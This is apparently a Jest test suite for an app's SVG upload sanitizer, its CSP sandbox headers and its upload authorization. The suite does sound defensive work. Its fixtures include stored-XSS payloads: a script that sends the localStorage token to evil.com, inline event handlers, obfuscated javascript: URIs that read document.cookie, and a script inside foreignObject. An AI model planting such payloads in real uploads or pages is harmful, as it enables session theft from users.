const fs = require('fs');
const path = require('path');
const request = require('supertest');
const app = require('../server');
const User = require('../models/User');
const { sanitizeSvgContent, isDangerousUri } = require('../utils/svgSanitizer');

require('./setup');

describe('SEC-05: SVG Upload Sanitization & CSP Sandboxing Suite', () => {
    let adminToken;
    let studentToken;
    let uploadedFilesToCleanup = [];

    beforeAll(async () => {
        const adminUser = await User.create({
            name: 'SVG Admin',
            email: `svg_admin_${Date.now()}@test.com`,
            password: 'AdminPassword123!',
            isEmailVerified: true,
            role: 'admin',
        });
        adminToken = adminUser.getSignedJwtToken();

        const studentUser = await User.create({
            name: 'SVG Student',
            email: `svg_student_${Date.now()}@test.com`,
            password: 'StudentPassword123!',
            isEmailVerified: true,
            role: 'student',
        });
        studentToken = studentUser.getSignedJwtToken();
    });

    afterAll(async () => {
        for (const filePath of uploadedFilesToCleanup) {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            } catch (_) {}
        }
    });

    describe('1. svgSanitizer Unit Tests', () => {
        test('preserves valid SVG icons and vector elements', () => {
            const cleanSvg = `
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
                    <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />
                    <path d="M 10 80 Q 52.5 10, 95 80 T 180 80" fill="none" stroke="black" />
                    <text x="20" y="50" fill="red">DolphinCoder</text>
                </svg>
            `;
            const result = sanitizeSvgContent(cleanSvg);
            expect(result.isValid).toBe(true);
            expect(result.isClean).toBe(true);
            expect(result.hasMalicious).toBe(false);
            expect(result.detectedThreats).toEqual([]);
            expect(result.cleanSvg).toContain('<circle');
            expect(result.cleanSvg).toContain('<path');
            expect(result.cleanSvg).toContain('DolphinCoder');
        });

        test('detects and strips <script> tags from SVG', () => {
            const maliciousSvg = `
                <svg xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="40" fill="red" />
                    <script type="text/javascript">
                        fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
                    </script>
                </svg>
            `;
            const result = sanitizeSvgContent(maliciousSvg);
            expect(result.isValid).toBe(true);
            expect(result.isClean).toBe(false);
            expect(result.hasMalicious).toBe(true);
            expect(result.detectedThreats).toContain('tag:script');
            expect(result.cleanSvg).not.toContain('<script');
            expect(result.cleanSvg).not.toContain('evil.com');
            expect(result.cleanSvg).toContain('<circle');
        });

        test('detects and strips inline event handlers (onload, onerror, onclick)', () => {
            const maliciousSvg = `
                <svg xmlns="http://www.w3.org/2000/svg" onload="alert('xss1')">
                    <circle cx="50" cy="50" r="40" fill="blue" onerror="alert('xss2')" onclick="alert('xss3')" />
                </svg>
            `;
            const result = sanitizeSvgContent(maliciousSvg);
            expect(result.isValid).toBe(true);
            expect(result.hasMalicious).toBe(true);
            expect(result.cleanSvg).not.toContain('onload');
            expect(result.cleanSvg).not.toContain('onerror');
            expect(result.cleanSvg).not.toContain('onclick');
            expect(result.cleanSvg).not.toContain("alert('xss1')");
        });

        test('detects and neutralizes javascript: and data: URIs in href and xlink:href', () => {
            const maliciousSvg = `
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                    <a xlink:href="javascript:alert(document.cookie)">
                        <text x="10" y="25">Click Me</text>
                    </a>
                    <a href="jav&#x09;ascript:alert('obfuscated')">
                        <text x="10" y="50">Obfuscated Link</text>
                    </a>
                </svg>
            `;
            const result = sanitizeSvgContent(maliciousSvg);
            expect(result.isValid).toBe(true);
            expect(result.hasMalicious).toBe(true);
            expect(result.cleanSvg).not.toContain('javascript:alert');
            expect(result.cleanSvg).not.toContain('obfuscated');
        });

        test('detects and strips <foreignObject> tags', () => {
            const maliciousSvg = `
                <svg xmlns="http://www.w3.org/2000/svg">
                    <foreignObject width="100" height="50">
                        <body xmlns="http://www.w3.org/1999/xhtml">
                            <script>alert('foreignObject-xss')</script>
                        </body>
                    </foreignObject>
                </svg>
            `;
            const result = sanitizeSvgContent(maliciousSvg);
            expect(result.isValid).toBe(true);
            expect(result.hasMalicious).toBe(true);
            expect(result.detectedThreats).toContain('tag:foreignObject');
            expect(result.cleanSvg).not.toContain('foreignObject');
            expect(result.cleanSvg).not.toContain('foreignObject-xss');
        });

        test('rejects non-SVG content', () => {
            const invalidContent = '<html><body>Not an SVG</body></html>';
            const result = sanitizeSvgContent(invalidContent);
            expect(result.isValid).toBe(false);
            expect(result.detectedThreats).toContain('missing-svg-tag');
        });

        test('isDangerousUri accurately identifies executable schemes', () => {
            expect(isDangerousUri('javascript:alert(1)')).toBe(true);
            expect(isDangerousUri('JAVASCRIPT:alert(1)')).toBe(true);
            expect(isDangerousUri('java\nscript:alert(1)')).toBe(true);
            expect(isDangerousUri('&#106;avascript:alert(1)')).toBe(true);
            expect(isDangerousUri('vbscript:msgbox(1)')).toBe(true);
            expect(isDangerousUri('data:text/html;base64,PHNjcmlwdD4=')).toBe(true);
            expect(isDangerousUri('https://dolphincoder.com/logo.png')).toBe(false);
            expect(isDangerousUri('/uploads/pages/image.png')).toBe(false);
        });
    });

    describe('2. Static File Serving CSP Sandboxing (/uploads)', () => {
        const testSvgPath = path.join(__dirname, '../uploads/pages/test-sandbox-header.svg');

        beforeAll(() => {
            const dir = path.dirname(testSvgPath);
            if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
            fs.writeFileSync(testSvgPath, '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="10" cy="10" r="5"/></svg>');
            uploadedFilesToCleanup.push(testSvgPath);
        });

        test('sets Content-Security-Policy sandbox and X-Content-Type-Options on SVG files', async () => {
            const res = await request(app).get('/uploads/pages/test-sandbox-header.svg');
            expect(res.status).toBe(200);
            expect(res.headers['x-content-type-options']).toBe('nosniff');
            expect(res.headers['content-security-policy']).toBe("default-src 'none'; style-src 'unsafe-inline'");
        });
    });

    describe('3. POST /api/pages/upload-image Endpoint Protection', () => {
        test('rejects unauthenticated upload requests with 401', async () => {
            const res = await request(app)
                .post('/api/pages/upload-image')
                .attach('image', Buffer.from('<svg></svg>'), 'test.svg');
            expect(res.status).toBe(401);
        });

        test('rejects non-admin (student) upload requests with 403', async () => {
            const res = await request(app)
                .post('/api/pages/upload-image')
                .set('Authorization', `Bearer ${studentToken}`)
                .attach('image', Buffer.from('<svg></svg>'), 'test.svg');
            expect(res.status).toBe(403);
        });

        test('rejects malicious SVG containing <script> with 400', async () => {
            const evilSvg = `
                <svg xmlns="http://www.w3.org/2000/svg">
                    <circle cx="50" cy="50" r="40" fill="red" />
                    <script>alert('Stored XSS Attempt')</script>
                </svg>
            `;
            const res = await request(app)
                .post('/api/pages/upload-image')
                .set('Authorization', `Bearer ${adminToken}`)
                .attach('image', Buffer.from(evilSvg), 'exploit.svg');

            expect(res.status).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.message).toContain('Uploaded SVG contains dangerous scripts or active event handlers');
            expect(res.body.threats).toBeDefined();
        });

        test('rejects malicious SVG containing event handlers with 400', async () => {
            const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"><rect width="10" height="10"/></svg>`;
            const res = await request(app)
                .post('/api/pages/upload-image')
                .set('Authorization', `Bearer ${adminToken}`)
                .attach('image', Buffer.from(evilSvg), 'exploit-onload.svg');

            expect(res.status).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.threats).toBeDefined();
        });

        test('accepts clean SVG upload, stores it safely, and returns relative URL', async () => {
            const cleanSvg = `
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="40" fill="purple" />
                    <text x="25" y="55" fill="white">LMS Safe SVG</text>
                </svg>
            `;
            const res = await request(app)
                .post('/api/pages/upload-image')
                .set('Authorization', `Bearer ${adminToken}`)
                .attach('image', Buffer.from(cleanSvg), 'safe-icon.svg');

            expect(res.status).toBe(200);
            expect(res.body.success).toBe(true);
            expect(res.body.url).toMatch(/^\/uploads\/pages\/page-.*\.svg$/);
            expect(res.body.filename).toBeDefined();

            const savedPath = path.join(__dirname, '../uploads/pages', res.body.filename);
            uploadedFilesToCleanup.push(savedPath);

            expect(fs.existsSync(savedPath)).toBe(true);
            const savedContent = fs.readFileSync(savedPath, 'utf8');
            expect(savedContent).toContain('LMS Safe SVG');
            expect(savedContent).not.toContain('<script');
        });
    });
});
